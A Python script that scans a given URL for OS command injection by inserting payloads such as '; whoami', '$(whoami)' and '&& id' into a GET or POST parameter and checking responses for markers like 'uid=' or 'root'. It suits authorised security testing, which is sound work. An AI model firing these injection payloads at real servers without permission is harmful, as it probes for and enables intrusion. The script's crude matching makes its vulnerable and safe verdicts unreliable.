import argparse
import requests
from bs4 import BeautifulSoup
import logging
import sys
import urllib.parse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define payloads for command injection testing
COMMAND_INJECTION_PAYLOADS = [
    "| whoami",
    "; whoami",
    "&& whoami",
    "|| whoami",
    "| id",
    "; id",
    "&& id",
    "|| id",
    "`whoami`",
    "$(whoami)",
    "%0Awhoami", # URL encoded newline + whoami
    "%0Dwhoami"  # URL encoded carriage return + whoami
]

# Define indicators of command execution success
COMMAND_EXECUTION_INDICATORS = [
    "uid=",  # Common in 'id' command output
    "gid=",  # Common in 'id' command output
    "www-data", # Common user for web servers
    "root", #Common user
    "NT AUTHORITY\\SYSTEM" # Common Windows user
]


def setup_argparse():
    """
    Sets up the argument parser for the command-line interface.
    """
    parser = argparse.ArgumentParser(description="Detect potential OS Command Injection vulnerabilities.")
    parser.add_argument("url", help="The URL to scan.")
    parser.add_argument("--data", help="Data to send in a POST request (e.g., 'param1=value1&param2=value2').  If not provided, a GET request will be used.", default=None)
    parser.add_argument("--param", help="The parameter to inject the payload into.  Required if --data is used.", default=None)
    parser.add_argument("--method", help="The HTTP method to use (GET or POST).  Defaults to GET, use POST if --data is provided.", choices=['GET', 'POST'], default='GET')
    parser.add_argument("--headers", help="Custom headers to send (e.g., 'Header1: Value1, Header2: Value2').", default=None)
    parser.add_argument("--timeout", help="Request timeout in seconds", type=int, default=10)

    return parser.parse_args()


def is_vulnerable(response_text):
    """
    Checks if the response text contains indicators of successful command execution.

    Args:
        response_text (str): The text of the HTTP response.

    Returns:
        bool: True if a command execution indicator is found, False otherwise.
    """
    if not response_text:
        return False

    for indicator in COMMAND_EXECUTION_INDICATORS:
        if indicator.lower() in response_text.lower():
            return True
    return False


def send_request(url, method="GET", data=None, headers=None, payload=None, param=None, timeout=10):
    """
    Sends an HTTP request with the given parameters.  Handles both GET and POST requests.

    Args:
        url (str): The URL to request.
        method (str): The HTTP method (GET or POST).
        data (str): The data to send in a POST request.
        headers (dict): A dictionary of headers to send.
        payload (str): The payload to inject.
        param (str): The parameter to inject into.
        timeout (int): Timeout in seconds.

    Returns:
        requests.Response: The HTTP response object, or None on error.
    """
    try:
        if headers:
            # Convert headers string to dictionary
            header_dict = {}
            for header_pair in headers.split(','):
                try:
                    key, value = header_pair.split(':')
                    header_dict[key.strip()] = value.strip()
                except ValueError:
                    logging.error(f"Invalid header format: {header_pair}.  Skipping.")
                    return None
        else:
            header_dict = {}


        if method == "GET":
            # Properly URL encode the payload in the GET request.
            if "?" in url:
                url += "&" + urllib.parse.quote_plus(param) + "=" + urllib.parse.quote_plus(payload)
            else:
                url += "?" + urllib.parse.quote_plus(param) + "=" + urllib.parse.quote_plus(payload)
            
            response = requests.get(url, headers=header_dict, timeout=timeout)

        elif method == "POST":
            post_data = {}
            # Parse the data string into a dictionary
            if data:
                for data_pair in data.split('&'):
                    try:
                        key, value = data_pair.split('=')
                        post_data[key.strip()] = value.strip()
                    except ValueError:
                         logging.error(f"Invalid data format: {data_pair}. Skipping.")
                         return None
                # Inject the payload into the specified parameter
                if param in post_data:
                    post_data[param] = payload
                else:
                    logging.error(f"Parameter '{param}' not found in POST data.")
                    return None
            response = requests.post(url, data=post_data, headers=header_dict, timeout=timeout)
        else:
            logging.error(f"Invalid HTTP method: {method}")
            return None

        response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
        return response

    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        return None

def main():
    """
    Main function to execute the OS Command Injection vulnerability scan.
    """
    args = setup_argparse()

    url = args.url
    data = args.data
    param = args.param
    method = args.method
    headers = args.headers
    timeout = args.timeout
    
    # Input validation
    if not url:
        logging.error("URL is required.")
        sys.exit(1)
    
    if method == "POST" and (data is None or param is None):
         logging.error("When using POST, both --data and --param are required.")
         sys.exit(1)
    
    if method == "GET" and param is None:
        logging.error("When using GET, --param is required.")
        sys.exit(1)

    logging.info(f"Starting OS Command Injection scan on {url} using {method} method.")

    for payload in COMMAND_INJECTION_PAYLOADS:
        logging.info(f"Testing payload: {payload}")

        response = send_request(url, method, data, headers, payload, param, timeout)

        if response:
            if is_vulnerable(response.text):
                logging.warning(f"Potential OS Command Injection vulnerability detected with payload: {payload}")
                print(f"VULNERABLE: {url} is potentially vulnerable to OS Command Injection.")
                print(f"Payload used: {payload}")
                print(f"Response:\n{response.text}")
                return  # Exit after first vulnerability is found
            else:
                logging.info(f"Payload {payload} did not trigger a vulnerability.")
        else:
            logging.error(f"Failed to get a valid response for payload: {payload}")

    print(f"SCAN COMPLETE: {url} appears to be safe from OS Command Injection using the tested payloads.")


if __name__ == "__main__":
    main()